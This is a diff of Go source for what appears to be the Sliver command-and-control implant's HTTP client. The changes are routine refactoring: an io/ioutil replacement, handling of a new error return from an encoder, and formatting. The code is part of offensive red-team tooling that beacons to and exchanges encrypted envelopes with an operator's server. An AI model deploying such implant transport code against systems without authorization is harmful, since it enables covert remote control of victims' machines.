@@ -26,7 +26,6 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"io/ioutil"
 	insecureRand "math/rand"
 	"net/http"
 	"net/url"
@@ -56,9 +55,9 @@ const (
 )
 
 var (
-	ErrClosed               = errors.New("http session closed")
-	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
-	TimeDelta time.Duration = 0
+	ErrClosed                             = errors.New("http session closed")
+	ErrStatusCodeUnexpected               = errors.New("unexpected http response code")
+	TimeDelta               time.Duration = 0
 )
 
 // HTTPOptions - c2 specific configuration options
@@ -157,16 +156,16 @@ type HTTPDriver interface {
 
 // SliverHTTPClient - Helper struct to keep everything together
 type SliverHTTPClient struct {
-	Origin      string
-	PathPrefix  string
-	driver      HTTPDriver
-	ProxyURL    string
-	SessionCtx  *cryptography.CipherContext
-	SessionID   string
-	pollTimeout time.Duration
-	pollCancel  context.CancelFunc
-	pollMutex   *sync.Mutex
-	Closed      bool
+	Origin     string
+	PathPrefix string
+	driver     HTTPDriver
+	ProxyURL   string
+	SessionCtx *cryptography.CipherContext
+	SessionID  string
+	// pollTimeout time.Duration
+	pollCancel context.CancelFunc
+	pollMutex  *sync.Mutex
+	Closed     bool
 
 	Options *HTTPOptions
 }
@@ -312,7 +311,7 @@ func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, []byte, er
 			done <- http.ErrHandlerTimeout
 		default:
 			if err == nil && resp != nil {
-				data, err = ioutil.ReadAll(resp.Body)
+				data, err = io.ReadAll(resp.Body)
 				defer resp.Body.Close()
 			}
 			// {{if .Config.Debug}}
@@ -330,7 +329,7 @@ func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, []byte, er
 // session key yet.
 func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 	nonce, encoder := encoders.RandomEncoder()
-	payload := encoder.Encode(sessionInit)
+	payload, _ := encoder.Encode(sessionInit)
 	reqBody := bytes.NewReader(payload)
 
 	uri := s.startSessionURL()
@@ -353,19 +352,19 @@ func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 	if resp.StatusCode != http.StatusOK {
 		serverDateHeader := resp.Header.Get("Date")
 		if serverDateHeader != "" {
-				// If the request failed and there is a Date header, find the time difference and save it for the next request
-				curTime := time.Now().UTC()
-				serverTime, err := time.Parse(time.RFC1123, serverDateHeader)
-				if err == nil {
-					TimeDelta = serverTime.UTC().Sub(curTime)
-				}
+			// If the request failed and there is a Date header, find the time difference and save it for the next request
+			curTime := time.Now().UTC()
+			serverTime, err := time.Parse(time.RFC1123, serverDateHeader)
+			if err == nil {
+				TimeDelta = serverTime.UTC().Sub(curTime)
+			}
 		}
 		// {{if .Config.Debug}}
 		log.Printf("[http] non-200 response (%d): %v", resp.StatusCode, resp)
 		// {{end}}
 		return errors.New("send failed")
 	}
-	respData, err := ioutil.ReadAll(resp.Body)
+	respData, err := io.ReadAll(resp.Body)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[http] response read error: %s", err)
@@ -480,7 +479,8 @@ func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 	uri := s.sessionURL()
 	nonce, encoder := encoders.RandomEncoder()
 	s.NonceQueryArgument(uri, nonce)
-	reader := bytes.NewReader(encoder.Encode(reqData))
+	encodedValue, _ := encoder.Encode(reqData)
+	reader := bytes.NewReader(encodedValue)
 
 	// {{if .Config.Debug}}
 	log.Printf("[http] POST -> %s (%d bytes)", uri, len(reqData))
